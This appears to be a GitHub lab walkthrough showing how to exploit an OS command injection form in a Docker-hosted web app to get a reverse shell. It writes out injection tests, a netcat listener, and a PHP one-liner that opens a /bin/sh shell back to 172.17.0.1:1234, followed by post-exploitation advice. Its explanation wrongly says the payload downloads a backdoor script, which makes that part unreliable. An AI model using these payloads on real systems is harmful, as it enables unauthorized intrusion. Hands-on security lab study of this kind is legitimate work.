# How-to-perform-reverse-shell
  - After successfully setting up the Docker container and deploying the backdoor script, the next steps involve identifying and exploiting vulnerabilities in the web application, specifically targeting OS command injection. Here's a detailed breakdown of what to do after setting up the Docker and backdoor:
## Identifying Vulnerabilities on the OS Command Injection Page

### Procedure:
- Navigate to the Vulnerability Section: Access the web application running inside the Docker container through your browser. Look for a menu or option labelled "Vulnerabilities" or similar.

![01](https://github.com/user-attachments/assets/591447ba-0361-40bd-b677-edc1049f726f)
![02](https://github.com/user-attachments/assets/a14fde97-ec16-4bf2-88fd-a6f3e18cb83f)


- Select Command Injection: Within the vulnerabilities section, identify and click on "Command Injection." This option typically brings you to a form or input field where commands can be injected.

![03](https://github.com/user-attachments/assets/b4bb4497-eb6d-442f-bf7a-c6acada2976b)
![04](https://github.com/user-attachments/assets/551001fb-3b03-43e1-aa1d-9fdece11113f)

### Understanding Command Injection:
- Command injection vulnerabilities occur when an application passes unsafe user-supplied data (in this case, input fields, query parameters, etc.) to a system shell. If the input is not properly sanitized, an attacker can execute arbitrary commands on the server.

- Test for Vulnerability. To test if the page is vulnerable, try injecting a simple command such as ; ls or && whoami. If the command is executed and the result is displayed (like listing the directory contents or showing the current user), then the application is vulnerable to OS command injection.

![05](https://github.com/user-attachments/assets/afe97bd7-b82a-4623-93ec-83752fa4654e)

## First : Run a Python HTTP Server
### Purpose:
- The Python HTTP server will host the backdoor script, allowing it to be served to the target machine.
### Command: 
- Open a new terminal and run the following command
`python3 -m http.server`

![06](https://github.com/user-attachments/assets/53b8ddce-d492-4f76-8b79-2e4ef70f94c4)

### Explanation: 
- This command will start a simple HTTP server that listens on port 8000 by default. The server will serve files from the directory in which the command is executed. Ensure that your backdoor script is in this directory, as it will be accessed via the web browser or a curl command from the target system.

![07](https://github.com/user-attachments/assets/02e8b468-4ac4-40f4-a906-c8cfaf299c3c)

## Find the Docker IP Address
### Purpose:
- Identifying the Docker container's IP address is crucial because it allows you to direct the backdoor connection back to your machine.
### Command:
In a new terminal, run the following command 
`ip a`

![08](https://github.com/user-attachments/assets/f90ff762-95e1-443b-b714-fe4dc480d423)
- this one
  
![09](https://github.com/user-attachments/assets/014ec44d-c709-4ab6-a95e-84379d5a692c)

### Explanation:
- his command displays all network interfaces and their associated IP addresses. Look for the `docker0` interface, which typically represents the Docker bridge network. The IP address associated with this interface is what you’ll use to direct the reverse shell.

## Set Up a Netcat Listener:
### Purpose:
- The Netcat listener will wait for an incoming connection from the target system, which will be initiated by the backdoor script.
### Command: 
Set up a listener on a specific port (e.g., 1234) using the following command

`nc -lvnp 1234`

![10](https://github.com/user-attachments/assets/c16ec49c-bbdc-4c7d-a91f-6e59ea6430c8)

### Explanation:
- The -l flag tells Netcat to listen for incoming connections, -v makes it verbose (to display the connection details), -n prevents DNS lookups, and -p specifies the port number to listen on. Once the backdoor script is executed on the target system, it will connect back to your machine on this port, giving you shell access.

## Execute the Reverse Shell: 
### Injection of Payload:
- With confirmation of the vulnerability, inject a payload that will download and execute your backdoor script from the Python HTTP server.
- Example command to inject

  `| php -r '$sock=fsockopen("172.17.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`

  ![11](https://github.com/user-attachments/assets/e5223b26-aecd-4752-837c-33a74907d512)

### Explanation
- This command tells the server to fetch the backdoor script from your Python HTTP server and execute it using PHP. Once executed, the backdoor will initiate a connection to your Netcat listener.

## Gain Shell Access:
- Once the payload is successfully injected and executed, you should see a connection on your Netcat listener. This connection gives you shell access to the target system, allowing you to execute commands as if you were directly logged into the server.

![Screenshot 2024-08-15 002815](https://github.com/user-attachments/assets/0184def1-73cd-4bed-af7e-a1b92ad04dcc)

## Post-Exploitation:
- With shell access, you can now navigate the target system, explore files, escalate privileges, or perform any other post-exploitation activities necessary to achieve your objectives.

## Conclusion
- By following these steps, you’ll be able to exploit the OS command injection vulnerability to gain unauthorized access to the target system through a reverse shell. This highlights the critical importance of secure coding practices and the need for rigorous input validation and sanitization in web applications.
